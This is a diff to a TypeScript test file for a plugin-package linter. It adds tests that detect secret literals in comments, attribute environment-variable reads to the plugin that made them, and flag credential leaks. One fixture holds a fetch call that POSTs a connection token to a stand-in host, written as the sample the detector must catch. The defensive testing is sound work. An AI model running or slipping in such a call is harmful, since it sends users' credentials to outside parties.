@@ -270,6 +270,25 @@ describe("lintPackage", () => {
       assert.deepEqual(rules(report), ["source/secret-literal"]);
     });
 
+    it("a secret in a comment is an error, and an Authorization header in one is not", async () => {
+      const report = await lint(
+        pkg({
+          "package.json": PACKAGE,
+          "index.ts": CLEAN,
+          "src/notes.ts": [
+            `// the old key: ghp_${"a".repeat(36)}`,
+            // biome-ignore lint/suspicious/noTemplateCurlyInString: plugin source under test
+            " * e.g. { authorization: `Bearer ${token}` }",
+            "export {};",
+          ].join("\n"),
+        }),
+      );
+      assert.deepEqual(
+        report.findings.map((f) => [f.rule, f.line]),
+        [["source/secret-literal", 1]],
+      );
+    });
+
     it("an install script and codemode as a dependency are errors", async () => {
       const report = await lint(
         pkg({
@@ -306,6 +325,21 @@ describe("lintPackage", () => {
       assert.match(finding.message, /token/);
     });
 
+    it("a connection secret in a form body is an error, however the body is built", async () => {
+      const report = await lint(
+        pkg({
+          "package.json": PACKAGE,
+          "index.ts": actionDoing(
+            "await fetch('https://x.example/token', { method: 'POST', body: new URLSearchParams({ key: ctx.connection.config.token }) });",
+          ),
+        }),
+      );
+      assert.ok(
+        rules(report, "error").includes("run/secret-outside-credential"),
+        rules(report).join(),
+      );
+    });
+
     it("an Authorization header sent around the credential layer is an error, whatever its value", async () => {
       const report = await lint(
         pkg({
@@ -340,6 +374,37 @@ describe("lintPackage", () => {
         [
           [undefined, "*"],
           [["order.list"], "ORDERS_TOKEN"],
+        ],
+      );
+    });
+
+    it("an environment read names the plugin that made it, in a package of several", async () => {
+      const plugin = (name: string, body: string) =>
+        actionDoing(body).replace(
+          'rl.setName("orders")',
+          `rl.setName("${name}")`,
+        );
+      const report = await lint(
+        pkg({
+          "package.json": JSON.stringify({
+            ...JSON.parse(PACKAGE),
+            codemode: { plugins: ["./a.ts", "./b.ts"] },
+          }),
+          "a.ts": plugin("alpha", "return process.env.ALPHA_TOKEN;"),
+          "b.ts": plugin("beta", "return process.env.BETA_TOKEN;"),
+        }),
+      );
+      assert.deepEqual(
+        report.findings
+          .filter((f) => f.rule === "run/env-read")
+          .map((f) => [
+            f.plugin,
+            f.actions,
+            f.message.match(/[A-Z]+_TOKEN/)?.[0],
+          ]),
+        [
+          ["alpha", ["order.list"], "ALPHA_TOKEN"],
+          ["beta", ["order.list"], "BETA_TOKEN"],
         ],
       );
     });
